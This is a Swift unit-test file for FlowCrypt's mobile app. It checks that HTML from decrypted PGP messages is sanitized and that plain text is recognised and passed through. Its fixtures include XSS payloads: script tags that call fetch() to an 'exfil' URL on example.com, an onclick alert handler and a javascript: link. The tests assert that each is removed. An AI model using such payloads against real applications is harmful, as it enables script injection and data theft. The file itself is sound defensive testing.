//
//  HTMLSanitizationTests.swift
//
//  Created by Mart on 30/06/2026
//  Copyright © 2017-present FlowCrypt a. s. All rights reserved.
//

@testable import FlowCrypt
import XCTest

class HTMLSanitizationTests: XCTestCase {
    let core: Core = .shared

    // MARK: - End-to-end: decrypt a PGP-encrypted XSS payload, then verify sanitization

    func test_decrypted_xss_payload_is_stripped_after_full_roundtrip() async throws {
        let key = TestData.k0
        let attackHtml = """
        <html>
          <body>
            <p>FC_DECRYPTED_PLAINTEXT_JS_POC</p>
            <script>
              fetch('https://example.com/exfil?data=secret')
            </script>
          </body>
        </html>
        """

        let encrypted = try await core.encrypt(
            data: attackHtml.data(),
            pubKeys: [key.public],
            password: nil
        )

        let decrypted = try await core.parseDecryptMsg(
            encrypted: encrypted,
            keys: [key],
            msgPwd: nil,
            isMime: true,
            verificationPubKeys: []
        )

        let sanitized = try await core.sanitizeHtml(html: decrypted.text)

        XCTAssertTrue(
            sanitized.contains("FC_DECRYPTED_PLAINTEXT_JS_POC"),
            "benign content must survive roundtrip"
        )

        XCTAssertFalse(
            sanitized.contains("<script"),
            "script tags must be removed after full decrypt+sanitize pipeline"
        )
        XCTAssertFalse(
            sanitized.contains("fetch("),
            "script body must be removed"
        )
        XCTAssertFalse(
            sanitized.contains("example.com"),
            "example URLs must be removed"
        )
    }

    func test_decrypted_html_without_tags_passes_through() async throws {
        let key = TestData.k0
        let plainText = "Hello, this is a normal encrypted message."

        let encrypted = try await core.encrypt(
            data: plainText.data(),
            pubKeys: [key.public],
            password: nil
        )
        let decrypted = try await core.parseDecryptMsg(
            encrypted: encrypted,
            keys: [key],
            msgPwd: nil,
            isMime: true,
            verificationPubKeys: []
        )
        let sanitized = try await core.sanitizeHtml(html: decrypted.text)

        XCTAssertEqual(sanitized, plainText)
    }

    // MARK: - sanitizeHtml unit tests

    func test_sanitize_html_strips_script_tags() async throws {
        let input = """
        <html><body><p>Hello</p><script>fetch('https://example.com/exfil')</script></body></html>
        """
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNotNil(sanitized.range(of: "Hello"))
        XCTAssertNil(sanitized.range(of: "<script"))
        XCTAssertNil(sanitized.range(of: "fetch("))
        XCTAssertNil(sanitized.range(of: "example.com"))
    }

    func test_sanitize_html_strips_inline_event_handlers() async throws {
        let input = "<p onclick=\"alert(1)\">Click me</p>"
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNotNil(sanitized.range(of: "Click me"))
        XCTAssertNil(sanitized.range(of: "onclick"))
        XCTAssertNil(sanitized.range(of: "alert"))
    }

    func test_sanitize_html_strips_javascript_protocol_in_links() async throws {
        let input = "<a href=\"javascript:alert('xss')\">click</a>"
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNil(sanitized.range(of: "javascript:"))
    }

    func test_sanitize_html_preserves_safe_plain_text() async throws {
        let input = "This is a plain text message with no HTML."
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertEqual(sanitized, input)
    }

    func test_sanitize_html_preserves_safe_formatting() async throws {
        let input = "<b>bold</b> and <i>italic</i>"
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNotNil(sanitized.range(of: "bold"))
        XCTAssertNotNil(sanitized.range(of: "italic"))
    }

    // MARK: - isHTMLString (decrypted-content routing detection)

    func test_is_html_string_detects_matching_tags() {
        let input = "<div>Hello</div>"
        XCTAssertTrue(input.isHTMLString)
    }

    func test_is_html_string_detects_nested_html() {
        let input = "<html><body><p>content</p></body></html>"
        XCTAssertTrue(input.isHTMLString)
    }

    func test_is_html_string_negative_for_plain_text() {
        let input = "Hello, this is a plain message."
        XCTAssertFalse(input.isHTMLString)
    }

    func test_is_html_string_negative_for_email_angle_brackets() {
        let input = "Please contact us at <user@example.com> for support."
        XCTAssertFalse(input.isHTMLString)
    }

    func test_is_html_string_negative_for_unmatched_opening_tag() {
        let input = "Just an opening <div without closing."
        XCTAssertFalse(input.isHTMLString)
    }
}
